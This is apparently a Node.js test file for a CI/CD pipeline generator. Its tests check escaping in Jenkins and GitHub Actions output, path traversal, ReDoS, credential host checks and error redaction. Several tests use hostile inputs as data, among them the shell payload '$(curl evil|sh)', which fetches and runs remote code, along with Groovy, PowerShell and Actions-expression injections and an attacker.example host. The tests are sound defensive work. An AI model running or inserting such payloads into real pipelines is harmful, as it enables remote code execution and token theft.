const { test } = require('node:test');
const assert = require('node:assert');
const axios = require('axios');
const { execFileSync } = require('node:child_process');
const path = require('node:path');

const JenkinsGenerator = require('../providers/cicd/JenkinsGenerator');
const { pathSegment, pathSegments, trimTrailingSlashes } = require('../utils/url');
const githubService = require('../services/githubService');
const { getAIProvider } = require('../providers/ai');
const { getCICDGenerator } = require('../providers/cicd');

test('Jenkinsfile output escapes quotes, backslashes and newlines in user text', () => {
  const generator = new JenkinsGenerator();
  const label = "Build') { sh 'pwned' } stage('x";
  const out = generator.generate(
    [
      { id: '1', type: 'trigger_push', data: { label: 'push', config: {} } },
      { id: '2', type: 'build', data: { label, config: { script: 'echo ok \\' } } },
    ],
    [{ id: 'e', source: '1', target: '2' }]
  );
  // The label stays inside one string literal: every quote is escaped.
  assert.ok(out.includes("stage('Build\\') { sh \\'pwned\\' } stage(\\'x')"), out);
  // A trailing backslash is doubled, so it can't escape the closing quote.
  assert.ok(out.includes("sh 'echo ok \\\\'"), out);
});

test('path segments are encoded and traversal is rejected', () => {
  assert.strictEqual(pathSegment('octo/cat'), 'octo%2Fcat');
  for (const bad of ['', '.', '..']) {
    assert.throws(() => pathSegment(bad), { status: 400 });
  }
  assert.strictEqual(pathSegments('feature/new ui'), 'feature/new%20ui');
  assert.strictEqual(pathSegments(''), '');
  assert.throws(() => pathSegments('src/../../user'), { status: 400 });
});

test('GitHub calls refuse a traversal owner before sending any request', async () => {
  const originalCreate = axios.create;
  const requested = [];
  axios.create = () => ({ get: async (url) => (requested.push(url), { data: [] }) });
  try {
    await assert.rejects(() => githubService.listBranches('token', '..', 'repo'), { status: 400 });
    assert.deepStrictEqual(requested, []);
    await githubService.listBranches('token', 'octo', 'my repo');
    assert.deepStrictEqual(requested, ['/repos/octo/my%20repo/branches']);
  } finally {
    axios.create = originalCreate;
  }
});

test('trailing-slash trimming is linear on long slash runs (no ReDoS)', () => {
  const evil = 'https://x' + '/'.repeat(200000) + 'y';
  const started = Date.now();
  assert.strictEqual(trimTrailingSlashes(evil), evil);
  assert.strictEqual(trimTrailingSlashes('https://gitlab.com///'), 'https://gitlab.com');
  assert.ok(Date.now() - started < 200, `took ${Date.now() - started}ms`);
});

test('prototype property names are not treated as providers or platforms', () => {
  for (const name of ['__proto__', 'constructor', 'toString', 'hasOwnProperty']) {
    assert.throws(() => getAIProvider(name), { status: 400, message: /Unknown AI provider/ });
    assert.throws(() => getCICDGenerator(name), /Unknown CI\/CD platform/);
  }
});

test('a provider without credentials is a 400 (setup issue), not a 500', () => {
  assert.throws(() => getAIProvider('anthropic'), { status: 400 });
});

test('sendError keeps 400 messages and hides 500 details in production', () => {
  const script = `
    const { sendError } = require('./utils/sendError');
    const res = { status(c) { this.code = c; return this; }, json(b) { this.body = b; return this; } };
    const bad = Object.assign(new Error('missing model'), { status: 400, expose: true });
    const out = [sendError(res, bad, 'Chat failed'), sendError({ ...res }, new Error('upstream secret'), 'Chat failed')]
      .map((r) => ({ code: r.code, body: r.body }));
    process.stdout.write(JSON.stringify(out));
  `;
  const run = (env) =>
    JSON.parse(
      execFileSync(process.execPath, ['-e', script], {
        cwd: path.join(__dirname, '..'),
        env: { ...process.env, NODE_ENV: env },
      }).toString()
    );

  const [prodBad, prodServer] = run('production');
  assert.deepStrictEqual(prodBad, { code: 400, body: { error: 'Chat failed: missing model' } });
  assert.deepStrictEqual(prodServer, { code: 500, body: { error: 'Chat failed' } });

  const [, devServer] = run('development');
  assert.deepStrictEqual(devServer, { code: 500, body: { error: 'Chat failed: upstream secret' } });
});

// ── CodeRabbit review on PR #25 ─────────────────────────────────────────────
const runController = require('../controllers/runController');
const { sendError: _unused } = require('../utils/sendError');
const aiService = require('../services/aiService');
const GitHubActionsGenerator = require('../providers/cicd/GitHubActionsGenerator');
const { execFileSync: run } = require('node:child_process');

test('server CI tokens are never paired with a caller-chosen host', () => {
  const saved = { gl: process.env.GITLAB_TOKEN, cc: process.env.CIRCLECI_TOKEN };
  process.env.GITLAB_TOKEN = 'server-gitlab-token';
  process.env.CIRCLECI_TOKEN = 'server-circle-token';
  try {
    const { resolveCredentials } = runController;
    // Default hosts may use the server tokens.
    assert.strictEqual(resolveCredentials('gitlab', {}, { operator: true }).token, 'server-gitlab-token');
    assert.strictEqual(resolveCredentials('circleci', {}, { operator: true }).token, 'server-circle-token');
    // A custom host without the caller's own token is refused, not given ours.
    assert.throws(() => resolveCredentials('gitlab', { url: 'https://gitlab.attacker.example' }, { operator: true }), {
      status: 400,
      message: /needs your own token/,
    });
    assert.throws(() => resolveCredentials('circleci', { url: 'https://circle.attacker.example' }, { operator: true }), {
      status: 400,
      message: /needs your own token/,
    });
    // With their own token, a custom host is fine.
    const own = resolveCredentials('gitlab', { url: 'https://gitlab.example.com', token: 'mine' });
    assert.strictEqual(own.token, 'mine');
    // Custom hosts must be https (the token travels to them).
    assert.throws(() => resolveCredentials('circleci', { url: 'http://circle.example.com', token: 'mine' }), {
      status: 400,
      message: /must use https/,
    });
  } finally {
    process.env.GITLAB_TOKEN = saved.gl;
    process.env.CIRCLECI_TOKEN = saved.cc;
    if (saved.gl === undefined) delete process.env.GITLAB_TOKEN;
    if (saved.cc === undefined) delete process.env.CIRCLECI_TOKEN;
  }
});

test('default step commands print the label; shell syntax in it is never run', () => {
  const generator = new GitHubActionsGenerator();
  const hostile = [
    "x $(curl evil|sh) `id` $HOME it's",
    "test'; Write-Output PWNED; #", // PowerShell on windows-latest
    '${{ github.event.pull_request.title }}', // expanded by Actions before the shell
    'a & calc | b > c',
  ];
  for (const label of hostile) {
    const command = generator._echoLabel(label);
    const inner = command.slice("echo 'Running ".length, -"...'".length);
    assert.match(command, /^echo 'Running .*\.\.\.'$/, command);
    assert.doesNotMatch(inner, /[$`'"{};&|<>#\\]/, command);
  }
  assert.strictEqual(generator._echoLabel('Build & test: v1.2'), "echo 'Running Build test: v1.2...'");
  assert.strictEqual(generator._echoLabel('$$$'), "echo 'Running job...'");

  // End to end: the generated workflow carries the safe command.
  const nodes = [
    { id: '1', type: 'trigger_push', data: { label: 'push', config: {} } },
    { id: '2', type: 'build', data: { label: hostile[2], config: {} } },
  ];
  const edges = [{ id: 'e', source: '1', target: '2' }];
  const yamlText = generator.generate(nodes, edges);
  assert.ok(!yamlText.includes('${{ github.event'), yamlText);

  // The emitted command really prints the text (POSIX sh) instead of running it.
  if (process.platform !== 'win32') {
    assert.strictEqual(run('sh', ['-c', generator._echoLabel(hostile[0])]).toString().trim(), 'Running x curl evil sh id HOME it s...');
  }
});

test('malformed JSON bodies are not echoed into logs or responses', async () => {
  const { errorHandler } = require('../middleware/errorHandler');
  const err = Object.assign(new SyntaxError('Unexpected token in JSON: {"token":"secret-abc'), {
    status: 400,
    type: 'entity.parse.failed',
  });
  const logged = [];
  const originalError = console.error;
  console.error = (...args) => logged.push(args.join(' '));
  const res = { headersSent: false, status(c) { this.code = c; return this; }, json(b) { this.body = b; return this; } };
  try {
    errorHandler(err, { method: 'POST', originalUrl: '/api/runs' }, res, () => {});
  } finally {
    console.error = originalError;
  }
  assert.deepStrictEqual(res.body, { error: 'Invalid JSON body' });
  assert.ok(!logged.join('\n').includes('secret-abc'), logged.join('\n'));
});

test('generating with an unknown provider is a 400, not a silent template', async () => {
  await assert.rejects(
    () => aiService.generatePipelineFromPrompt('node app', { aiProvider: 'not-a-provider' }),
    { status: 400, code: 'UNKNOWN_AI_PROVIDER' }
  );
});

test('getCICDGenerator rejects non-string platform names', () => {
  for (const name of [{}, ['github'], 42]) {
    assert.throws(() => getCICDGenerator(name), { status: 400 });
  }
});

test('sendError shows details in production only for errors we raised', () => {
  const script = `
    const { sendError } = require('./utils/sendError');
    const res = () => ({ status(c) { this.code = c; return this; }, json(b) { this.body = b; return this; } });
    const ours = Object.assign(new Error('Invalid AWS region'), { status: 400, expose: true });
    const upstream = Object.assign(new Error('provider said: internal detail'), { status: 400 });
    process.stdout.write(JSON.stringify([sendError(res(), ours, 'Chat failed').body, sendError(res(), upstream, 'Chat failed').body]));
  `;
  const [ours, upstream] = JSON.parse(
    run(process.execPath, ['-e', script], { cwd: path.join(__dirname, '..'), env: { ...process.env, NODE_ENV: 'production' } }).toString()
  );
  assert.deepStrictEqual(ours, { error: 'Chat failed: Invalid AWS region' });
  assert.deepStrictEqual(upstream, { error: 'Chat failed' });
});
